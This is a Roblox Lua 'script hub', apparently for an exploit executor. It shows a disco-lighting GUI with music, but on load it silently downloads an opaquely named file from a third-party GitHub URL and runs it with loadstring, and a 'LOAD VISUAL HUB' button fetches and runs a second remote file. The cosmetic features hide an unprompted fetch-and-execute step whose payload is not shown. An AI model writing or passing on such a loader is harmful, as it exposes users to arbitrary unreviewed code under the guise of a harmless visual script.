-- Disco Garden Script Hub
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Main GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DiscoGardenGUI"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- ========== 1ST SCRIPT AUTO-EXECUTE ==========
local function ExecuteFirstScript()
    local success, err = pcall(function()
        local response = game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true)
        if response and response ~= "" then
            local func = loadstring(response)
            if func then func() end
        else
            error("Empty response from first script.")
        end
    end)
    if not success then
        warn("First script failed: " .. tostring(err))
    end
end

-- Run first script safely
task.spawn(ExecuteFirstScript)

-- ========== DISCO LIGHT EFFECT ==========
local function SetupDiscoLights()
    local discoColors = {
        Color3.fromRGB(255, 0, 0),
        Color3.fromRGB(0, 255, 0),
        Color3.fromRGB(0, 0, 255),
        Color3.fromRGB(255, 255, 0),
        Color3.fromRGB(255, 0, 255)
    }

    task.spawn(function()
        while true do
            local color = discoColors[math.random(1, #discoColors)]
            Lighting.Ambient = color
            Lighting.OutdoorAmbient = color
            task.wait(0.5)
        end
    end)
end

SetupDiscoLights()

-- ========== MAIN UI FRAME ==========
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.4, 0, 0.3, 0)
MainFrame.Position = UDim2.new(0.3, 0, 0.35, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0.1, 0)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.2, 0)
Title.Text = "DISCO GARDEN HUB"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 24
Title.BackgroundTransparency = 1
Title.Parent = MainFrame

-- ========== DARK HUB VISUAL BUTTON ==========
local Button = Instance.new("TextButton")
Button.Name = "VisualHubButton"
Button.Size = UDim2.new(0.8, 0, 0.5, 0)
Button.Position = UDim2.new(0.1, 0, 0.3, 0)
Button.BackgroundColor3 = Color3.fromRGB(80, 180, 120)
Button.Text = "LOAD VISUAL HUB"
Button.Font = Enum.Font.GothamBold
Button.TextColor3 = Color3.new(1, 1, 1)
Button.TextSize = 18
Button.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0.1, 0)
ButtonCorner.Parent = Button

Button.MouseButton1Click:Connect(function()
    local success, err = pcall(function()
        local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/DARK%20HUB%20VISUAL"))()
        if func then
            Button.Text = "SUCCESS! 🌿"
            task.wait(2)
            Button.Text = "LOAD VISUAL HUB"
        else
            error("loadstring returned nil")
        end
    end)

    if not success then
        warn("VISUAL HUB failed: " .. tostring(err))
        Button.Text = "ERROR! TRY AGAIN"
        task.wait(2)
        Button.Text = "LOAD VISUAL HUB"
    end
end)

-- ========== CLOSE BUTTON ==========
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0.1, 0, 0.2, 0)
CloseButton.Position = UDim2.new(0.85, 0, 0.05, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
CloseButton.Text = "X"
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextSize = 18
CloseButton.Parent = MainFrame

CloseButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)

-- ========== MUSIC ==========
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://142376088"
sound.Looped = true
sound.Volume = 0.7
sound.Parent = player:WaitForChild("PlayerGui")
sound:Play()

-- Animate GUI on load
MainFrame.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Elastic), {
    Size = UDim2.new(0.4, 0, 0.3, 0)
}):Play()
